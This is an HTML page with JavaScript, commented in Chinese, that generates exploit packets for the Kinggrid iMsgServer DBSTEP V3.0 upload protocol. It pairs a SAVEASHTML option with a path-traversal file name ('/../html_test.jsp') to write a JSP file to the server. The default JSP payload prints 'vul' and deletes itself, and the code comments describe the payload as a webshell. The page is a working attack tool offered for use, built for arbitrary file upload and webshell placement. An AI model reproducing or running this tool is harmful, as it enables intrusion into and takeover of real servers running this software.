<body>
    <textarea id="history" cols="40" rows="10" placeholder="需要两个输入框时使用" style="height: 25%;width: 100%;">OPTION=saveashtml
HTMLNAME=../html_test.txt
DIRECTORY=</textarea>
    <textarea id="new" rows="10" placeholder="基本输入位置" style="height: 30%;width: 100%;"><% out.println("vul");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %></textarea>
    <div class="btn-gro1up">
        <button onclick="iMsgServerDataGenerate()" title="用于生成金格上次数据包">生成金格上传数据包</button>
    </div>
    <textarea id="result" rows="20" placeholder="显示结果位置" style="height: 25%;width: 100%;"></textarea>
</body>

<script type="text/javascript">
    var dom_textarea_history = document.getElementById("history")
    var dom_textarea_new = document.getElementById("new")
    var dom_textarea_result = document.getElementById("result")

    window.onload = function () {
        var iMsgServer2000_1 = "OPTION=SAVEASHTML\nHTMLNAME=/../html_test.jsp\nDIRECTORY=";
        dom_textarea_history.value = iMsgServer2000_1;
        iMsgServerDataGenerate();
    }


    function iMsgServerDataGenerate() {
        var new_str = getBase64Str(dom_textarea_history.value); //补全了"\r\n"
        var parameter_tmp = getStrLen(new_str, 17); //再补上固定的字段长度17（"DBSTEP=REJTVEVQ"用来检测数据包信息是否完整）

        content_tmp = getStrLen(dom_textarea_new.value, 0); //计算webshell的总长度,也会在默认补上"\r\n"

        hander_text = "DBSTEP V3.0     " + parameter_tmp + "       0        " + content_tmp + "DBSTEP=REJTVEVQ";
        dom_textarea_result.value = hander_text + "\r\n" + new_str + dom_textarea_new.value.trim() + "\r\n";

    }

    function getBase64Str(str) {
        var new_str = "";
        str = str.trim(); //去除前后空白字符
        var param_list = str.split("\n");
        for (var i = 0; i < param_list.length; i++) {
            var j = param_list[i].indexOf("=");
            new_str += (param_list[i].slice(0, j) + "=" + window.btoa(param_list[i].slice(j + 1)) + "\n"); //每行末尾补上了\n
        }
        return new_str;
    }

    function getStrLen(str, i) {
        str = str.trim();
        rows = str.split("\n").length; //参数占几行
        str_size = str.length + rows + 1 + i; //参数的实际长度（每行末尾补上了\r\n）
        str_tmp = str_size.toString();
        for (var i = 0; i < (16 - (str_size.toString().length)); i++) {
            str_tmp += ' ';
        }
        return str_tmp;
    }

</script>
